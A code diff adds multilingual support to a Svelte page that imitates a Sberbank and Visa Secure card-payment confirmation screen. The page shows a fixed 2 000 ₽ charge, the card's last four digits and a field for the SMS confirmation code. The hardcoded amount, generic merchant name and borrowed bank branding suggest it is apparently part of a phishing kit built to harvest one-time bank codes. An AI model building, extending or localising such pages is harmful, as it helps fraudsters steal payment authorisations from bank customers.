@@ -7,6 +7,9 @@
 </svelte:head>
 
 <script>
+    import { onMount } from "svelte";
+    import { t, locale, locales } from "./../Translations/i18n.js";
+    import {defineUserLanguage} from './../Helpers/Helper.js';
     export let number;
     let timerValue;
     const dateToday = new Date().toLocaleDateString();
@@ -19,10 +22,23 @@
         }, 1000)
     }
     timerInit();
+    
+    $: time = new Date().toLocaleDateString($locale, {
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+    });
+    onMount(()=> { $locale = defineUserLanguage() });
 </script>
 
 <section>
     <div class="wraper">
+        <select bind:value={$locale}>
+            {#each locales as l}
+                <option value={l}>{l}</option>
+            {/each}
+        </select>
         <div class="logo">
             <img src="img/chek/sberbankLogo.png" alt="">
             <img src="img/chek/visasecure.png" alt="">
@@ -32,29 +48,29 @@
                 <h1>2 000 ₽</h1>
             </div>
             <div class="info__place">
-                <p>Магазин</p>
+                <p>{@html $t("check.store")}</p>
                 <p>psp</p>
             </div>
             <div class="info__card">
-                <p>Номер карты</p>
+                <p>{@html $t("check.number")}</p>
                 <p>** {number.slice(number.length-4)}</p>
             </div>
             <div class="info__date">
-                <p>Дата</p>
+                <p>{@html $t("check.date")}</p>
                 <p>
                     {dateToday}
                 </p>
             </div>
         </div>
         <div class="text">
-            <h2>Отправили Код</h2>
-            <p>Для его получения ваш номер должен быть подключен к СМС-банку</p>
+            <h2>{@html $t("check.sendCode")}</h2>
+            <p>{@html $t("check.sendConditions")}</p>
         </div>
         <div class="input-info">
-            <p>Введите код для оплаты покупки</p>
+            <p>{@html $t("check.enterCode")}</p>
             <input name="kod" class="" autocomplete="tel-country-code" pattern="[0-9]*" type="text">
             {#if timerValue > 0}
-                <p>Повторный запрос через <b> {timerValue} секунд</b></p>
+                <p>{@html $t("check.codeRequest")} <b> {timerValue} {@html $t("check.seconds")}</b></p>
             {:else}
                 <button class="getNewCode"
                     on:click={timerInit}>запрос кода</button>
